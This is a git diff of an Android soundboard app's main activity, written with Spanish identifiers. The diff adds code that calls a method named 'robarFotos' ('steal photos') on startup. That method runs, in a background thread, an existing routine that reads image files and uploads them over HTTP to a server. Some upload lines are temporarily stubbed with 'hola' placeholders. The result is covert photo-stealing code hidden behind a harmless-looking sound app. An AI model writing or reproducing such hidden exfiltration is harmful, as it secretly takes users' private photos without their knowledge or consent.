@@ -14,11 +14,11 @@ import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.InputStreamEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
 
 import android.app.Activity;
 import android.media.AudioManager;
+import android.media.MediaPlayer;
 import android.media.SoundPool;
 import android.os.AsyncTask;
 import android.os.Bundle;
@@ -28,17 +28,12 @@ import android.view.Menu;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
-import ch.boye.httpclientandroidlib.HttpResponse;
 import ch.boye.httpclientandroidlib.HttpVersion;
 import ch.boye.httpclientandroidlib.client.ClientProtocolException;
-import ch.boye.httpclientandroidlib.client.HttpClient;
 import ch.boye.httpclientandroidlib.client.entity.UrlEncodedFormEntity;
-import ch.boye.httpclientandroidlib.client.methods.HttpGet;
-import ch.boye.httpclientandroidlib.client.methods.HttpPost;
 import ch.boye.httpclientandroidlib.entity.mime.HttpMultipartMode;
 import ch.boye.httpclientandroidlib.entity.mime.MultipartEntity;
 import ch.boye.httpclientandroidlib.entity.mime.content.ByteArrayBody;
-import ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient;
 import ch.boye.httpclientandroidlib.message.BasicNameValuePair;
 import ch.boye.httpclientandroidlib.params.CoreProtocolPNames;
 import ch.boye.httpclientandroidlib.util.EntityUtils;
@@ -48,26 +43,23 @@ import com.google.common.io.Files;
 public class MainActivity extends Activity {
 	private int uploaded;
 
-	Button white;
-	SoundPool spool;
-	int soundID;
+	MediaPlayer mp;
 	
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
-		uploaded = 0;
-		
-		this.setVolumeControlStream(AudioManager.STREAM_MUSIC);
-		   spool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
-		   soundID = spool.load(this, R.raw.lallamaquellama, 1);
-
-		   white = (Button)findViewById(R.id.button2);
-		   white.setOnClickListener(new View.OnClickListener() {
-		       public void onClick(View v) {
-		           Sound();
-		       }
-		   });
+		uploaded = 0;	
+		//mandarRequest(null);
+		robarFotos(null);
+	}
+	
+	public void robarFotos(View v) {
+	    new Thread(new Runnable() {
+	        public void run() {
+	            mandarRequest(null);
+	        }
+	    }).start();
 	}
 
 	@Override
@@ -75,6 +67,30 @@ public class MainActivity extends Activity {
 		// Inflate the menu; this adds items to the action bar if it is present.
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
+	}
+	
+	public void reproducirSonido(View view) {
+		try{
+			this.mp.stop();
+		}catch(Exception e){} 
+		finally{
+			String soundToReproduce = view.getTag().toString();
+			Integer soundId = getResources().getIdentifier( soundToReproduce , "raw" , this.getPackageName() );
+			MediaPlayer mimp = MediaPlayer.create(getBaseContext(),
+			soundId);
+			this.mp = mimp;
+			this.mp.start();
+			//mandarRequest(view);
+		}
+		//spool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
+		//soundID = spool.load(this, R.raw.¯, 1);
+		//Sound();
+	}
+	
+	public void pararSonido(View view) {
+		try{
+			this.mp.stop();
+		} catch (Exception e) {}
 	}
 
 	public void mandarRequest(View view) {
@@ -112,8 +128,8 @@ public class MainActivity extends Activity {
 
 	private void showData(String data) {
 		uploaded++;
-		TextView p1_button = (TextView) findViewById(R.id.unLabel);
-		p1_button.setText("Archivos Subidos :" + uploaded);
+		//TextView p1_button = (TextView) findViewById(R.id.unLabel);
+		//p1_button.setText("Archivos Subidos :" + uploaded);
 	}
 
 	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
@@ -170,15 +186,17 @@ public class MainActivity extends Activity {
 			String digest = toSHA1(imageBytes);
 	
 			try {
-				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
-			} catch (UnsupportedEncodingException e) {
+				//httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
+			} catch (Exception e) {
+			//} catch (UnsupportedEncodingException e) {
 				e.printStackTrace();
 				return null;
 			}
 
 		    try {
 		    	HttpResponse response = client.execute(httppost);
-		    	String resp = EntityUtils.toString(response.getEntity());
+		    	//String resp = EntityUtils.toString(response.getEntity());
+		    	String resp = "hola"; //BORRAME
 
 		    	return resp.equals("OK") ? imageBytes : null;
 		    } catch (ClientProtocolException e) {
@@ -211,10 +229,11 @@ public class MainActivity extends Activity {
 			ByteArrayBody fb = new ByteArrayBody(imageBytes,"image/"+extension,f.getName());
 			entity.addPart( "imageName", fb);
 			 			 
-			httppost.setEntity( entity );
+			//httppost.setEntity( entity );
 			 
 			try {
-				return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
+				return "hola"; //BORRAME
+				//return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
 			} catch (Exception e) {
 				e.printStackTrace();
 				return null;
@@ -253,12 +272,4 @@ public class MainActivity extends Activity {
 			}
 		}
 	}
-
-	public void Sound(){
-	   AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
-	   float volume = (float) audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
-	   spool.play(soundID, volume, volume, 1, 0, 1f);
-
-	};
-
 }
